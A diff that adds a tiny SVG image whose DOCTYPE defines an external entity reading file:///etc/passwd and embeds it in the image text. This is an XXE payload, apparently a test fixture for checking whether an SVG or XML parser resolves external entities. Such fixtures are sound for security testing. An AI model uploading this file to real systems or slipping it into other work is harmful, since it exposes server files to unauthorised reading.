@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY local SYSTEM "file:///etc/passwd">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">
+  <text>&local;</text>
+  <rect width="10" height="10" fill="#0088cc"/>
+</svg>
